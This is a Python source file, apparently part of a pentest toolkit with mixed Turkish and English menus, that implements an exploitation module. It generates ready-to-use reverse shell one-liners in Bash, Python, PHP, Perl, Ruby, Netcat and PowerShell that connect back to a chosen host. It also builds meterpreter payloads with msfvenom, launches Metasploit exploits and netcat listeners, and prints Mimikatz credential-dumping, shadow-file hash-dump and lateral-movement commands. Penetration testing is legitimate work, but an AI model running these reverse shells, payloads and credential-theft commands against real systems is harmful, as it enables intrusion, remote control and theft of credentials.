"""
Exploitation Module - Exploit Tools and Helpers
"""

import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.colors import *
from utils.helpers import *

class ExploitationModule:
    def __init__(self):
        self.output_dir = create_output_dir("output/exploits")
        
    def show_menu(self):
        while True:
            clear_screen()
            print_banner("""
╔═══════════════════════════════════════════════════════════╗
║                 EXPLOITATION TOOLS                         ║
╚═══════════════════════════════════════════════════════════╝
            """)
            print(f"""
{Colors.CYAN}[1]{Colors.END} Metasploit Framework
{Colors.CYAN}[2]{Colors.END} SearchSploit (Exploit-DB)
{Colors.CYAN}[3]{Colors.END} Reverse Shell Generator
{Colors.CYAN}[4]{Colors.END} Payload Generator (msfvenom)
{Colors.CYAN}[5]{Colors.END} Netcat Listener
{Colors.CYAN}[6]{Colors.END} File Transfer Helpers
{Colors.CYAN}[7]{Colors.END} Privilege Escalation Checkers
{Colors.CYAN}[8]{Colors.END} Post Exploitation Tools
{Colors.CYAN}[0]{Colors.END} Back to Main Menu
            """)
            
            choice = get_input("Your choice")
            
            if choice == "0":
                break
            elif choice == "1":
                self.metasploit()
            elif choice == "2":
                self.searchsploit()
            elif choice == "3":
                self.reverse_shell_gen()
            elif choice == "4":
                self.msfvenom_payload()
            elif choice == "5":
                self.netcat_listener()
            elif choice == "6":
                self.file_transfer()
            elif choice == "7":
                self.privesc_check()
            elif choice == "8":
                self.post_exploit()
            else:
                print_error("Invalid selection!")
                input("\nPress Enter to continue...")

    def metasploit(self):
        clear_screen()
        print_banner("=== METASPLOIT FRAMEWORK ===\n")
        
        if not check_tool("msfconsole"):
            print_error("Metasploit is not installed!")
            input("\nPress Enter to continue...")
            return
        
        print(f"""
{Colors.YELLOW}Seçenekler:{Colors.END}
[1] msfconsole başlat
[2] msfdb başlat (database)
[3] Exploit ara
[4] Hızlı exploit çalıştır
        """)
        
        choice = get_input("Seçim", "1")
        
        if choice == "1":
            print_info("Metasploit başlatılıyor...")
            run_command_live("msfconsole")
        elif choice == "2":
            run_command_live("msfdb start && msfconsole")
        elif choice == "3":
            search = get_input("Arama terimi")
            if search:
                cmd = f"msfconsole -q -x 'search {search}; exit'"
                run_command_live(cmd)
        elif choice == "4":
            exploit = get_input("Exploit path (e.g.: exploit/windows/smb/ms17_010)")
            if exploit:
                rhost = get_input("RHOST")
                lhost = get_input("LHOST")
                cmd = f"msfconsole -q -x 'use {exploit}; set RHOSTS {rhost}; set LHOST {lhost}; run; exit'"
                run_command_live(cmd)
        
        input("\nPress Enter to continue...")

    def searchsploit(self):
        clear_screen()
        print_banner("=== SEARCHSPLOIT ===\n")
        
        if not check_tool("searchsploit"):
            print_error("SearchSploit is not installed!")
            input("\nPress Enter to continue...")
            return
        
        query = get_input("Arama terimi (e.g.: apache 2.4)")
        
        if query:
            cmd = f"searchsploit {query}"
            print_info(f"Running command: {cmd}")
            run_command_live(cmd)
            
            if confirm("\nExploit kopyalansin mi?"):
                exploit_id = get_input("Exploit ID/Path")
                if exploit_id:
                    run_command_live(f"searchsploit -m {exploit_id}")
        
        input("\nPress Enter to continue...")

    def reverse_shell_gen(self):
        clear_screen()
        print_banner("=== REVERSE SHELL GENERATOR ===\n")
        
        lhost = get_input("LHOST (Dinleyici IP)")
        lport = get_input("LPORT", "4444")
        
        if lhost and lport:
            shells = {
                "Bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                "Bash UDP": f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
                "Python": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "PHP": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "Perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
                "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "Netcat": f"nc -e /bin/sh {lhost} {lport}",
                "Netcat OpenBSD": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
                "PowerShell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
            }
            
            print_info("Reverse Shell Payloadları:\n")
            for name, shell in shells.items():
                print(f"{Colors.CYAN}[{name}]{Colors.END}")
                print(f"{shell}\n")
            
            timestamp = get_timestamp()
            output_file = f"{self.output_dir}/shells_{timestamp}.txt"
            with open(output_file, 'w') as f:
                for name, shell in shells.items():
                    f.write(f"[{name}]\n{shell}\n\n")
            print_success(f"Kaydedildi: {output_file}")
        
        input("\nPress Enter to continue...")

    def msfvenom_payload(self):
        clear_screen()
        print_banner("=== MSFVENOM PAYLOAD GENERATOR ===\n")
        
        if not check_tool("msfvenom"):
            print_error("msfvenom is not installed!")
            input("\nPress Enter to continue...")
            return
        
        print(f"""
{Colors.YELLOW}Platform Seçin:{Colors.END}
[1] Windows
[2] Linux
[3] macOS
[4] Android
[5] Web (PHP/ASP/JSP)
        """)
        
        platform = get_input("Seçim", "1")
        lhost = get_input("LHOST")
        lport = get_input("LPORT", "4444")
        
        payloads = {
            "1": ("windows/meterpreter/reverse_tcp", "exe"),
            "2": ("linux/x86/meterpreter/reverse_tcp", "elf"),
            "3": ("osx/x86/shell_reverse_tcp", "macho"),
            "4": ("android/meterpreter/reverse_tcp", "apk"),
            "5": ("php/meterpreter/reverse_tcp", "php"),
        }
        
        if platform in payloads:
            payload, ext = payloads[platform]
            timestamp = get_timestamp()
            output_file = f"{self.output_dir}/payload_{timestamp}.{ext}"
            
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {ext} -o {output_file}"
            print_info(f"Running command: {cmd}")
            run_command_live(cmd)
            print_success(f"Payload oluşturuldu: {output_file}")
        
        input("\nPress Enter to continue...")

    def netcat_listener(self):
        clear_screen()
        print_banner("=== NETCAT LISTENER ===\n")
        
        port = get_input("Dinlenecek port", "4444")
        
        print_info(f"Port {port} dinleniyor...")
        print_warning("Çıkmak için Ctrl+C")
        
        if check_tool("rlwrap"):
            cmd = f"rlwrap nc -lvnp {port}"
        else:
            cmd = f"nc -lvnp {port}"
        
        print_info(f"Running command: {cmd}")
        run_command_live(cmd)
        input("\nPress Enter to continue...")

    def file_transfer(self):
        clear_screen()
        print_banner("=== FILE TRANSFER HELPERS ===\n")
        
        print(f"""
{Colors.YELLOW}Yöntem Seçin:{Colors.END}
[1] Python HTTP Server
[2] PHP Server
[3] Netcat ile transfer
[4] SCP komutu oluştur
[5] Wget/Curl komutları
        """)
        
        choice = get_input("Seçim", "1")
        
        if choice == "1":
            port = get_input("Port", "8000")
            directory = get_input("Dizin", ".")
            print_info(f"Python HTTP Server başlatılıyor: http://0.0.0.0:{port}")
            cmd = f"python3 -m http.server {port} --directory {directory}"
            run_command_live(cmd)
        elif choice == "2":
            port = get_input("Port", "8000")
            print_info(f"PHP Server başlatılıyor: http://0.0.0.0:{port}")
            cmd = f"php -S 0.0.0.0:{port}"
            run_command_live(cmd)
        elif choice == "3":
            print_info("Alıcı tarafta: nc -lvp PORT > dosya")
            print_info("Gönderici tarafta: nc IP PORT < dosya")
        elif choice == "4":
            src = get_input("Kaynak (user@host:/path)")
            dst = get_input("Target")
            print_info(f"SCP Komutu: scp {src} {dst}")
        elif choice == "5":
            ip = get_input("Server IP")
            port = get_input("Port", "8000")
            filename = get_input("File name")
            print_info(f"\nWget: wget http://{ip}:{port}/{filename}")
            print_info(f"Curl: curl http://{ip}:{port}/{filename} -o {filename}")
            print_info(f"PowerShell: IWR -Uri http://{ip}:{port}/{filename} -OutFile {filename}")
        
        input("\nPress Enter to continue...")

    def privesc_check(self):
        clear_screen()
        print_banner("=== PRIVILEGE ESCALATION ===\n")
        
        print(f"""
{Colors.YELLOW}Platform:{Colors.END}
[1] Linux Enumeration
[2] Windows Enumeration
[3] LinPEAS/WinPEAS indir
        """)
        
        choice = get_input("Seçim", "1")
        
        if choice == "1":
            print_info("Linux Privilege Escalation Kontrolleri:\n")
            checks = [
                ("SUID Binaries", "find / -perm -4000 2>/dev/null"),
                ("Writable /etc/passwd", "ls -la /etc/passwd"),
                ("Sudo version", "sudo --version"),
                ("Kernel version", "uname -a"),
                ("Cron jobs", "cat /etc/crontab"),
                ("Running processes", "ps aux"),
            ]
            for name, cmd in checks:
                print(f"\n{Colors.CYAN}[{name}]{Colors.END}")
                print(f"Komut: {cmd}")
            
            if confirm("\nKontroller çalıştırılsın mı?"):
                for name, cmd in checks:
                    print(f"\n{Colors.CYAN}[{name}]{Colors.END}")
                    run_command_live(cmd)
        
        elif choice == "2":
            print_info("Windows Privilege Escalation Kontrolleri:\n")
            checks = [
                ("System Info", "systeminfo"),
                ("Current User", "whoami /all"),
                ("Network Info", "ipconfig /all"),
                ("Running Services", "net start"),
                ("Scheduled Tasks", "schtasks /query /fo LIST"),
            ]
            for name, cmd in checks:
                print(f"{Colors.CYAN}[{name}]{Colors.END}: {cmd}")
        
        elif choice == "3":
            print_info("LinPEAS: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh")
            print_info("WinPEAS: https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe")
            if confirm("LinPEAS indirilsin mi?"):
                run_command_live("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh")
        
        input("\nPress Enter to continue...")

    def post_exploit(self):
        clear_screen()
        print_banner("=== POST EXPLOITATION ===\n")
        
        print(f"""
{Colors.CYAN}[1]{Colors.END} Mimikatz komutları
{Colors.CYAN}[2]{Colors.END} Hash dump yöntemleri
{Colors.CYAN}[3]{Colors.END} Persistence yöntemleri
{Colors.CYAN}[4]{Colors.END} Lateral movement
        """)
        
        choice = get_input("Seçim", "1")
        
        if choice == "1":
            print_info("\nMimikatz Komutları:")
            cmds = [
                "privilege::debug",
                "sekurlsa::logonpasswords",
                "sekurlsa::tickets",
                "lsadump::sam",
                "lsadump::secrets",
            ]
            for c in cmds:
                print(f"  {c}")
        elif choice == "2":
            print_info("\nHash Dump Yöntemleri:")
            print("  Linux: cat /etc/shadow")
            print("  Windows: secretsdump.py DOMAIN/user@target")
            print("  Meterpreter: hashdump")
        elif choice == "3":
            print_info("\nPersistence Yöntemleri:")
            print("  Linux: crontab, .bashrc, systemd service")
            print("  Windows: Registry run keys, scheduled tasks, services")
        elif choice == "4":
            print_info("\nLateral Movement:")
            print("  PSExec: psexec.py user:pass@target")
            print("  WMIExec: wmiexec.py user:pass@target")
            print("  SMBExec: smbexec.py user:pass@target")
        
        input("\nPress Enter to continue...")
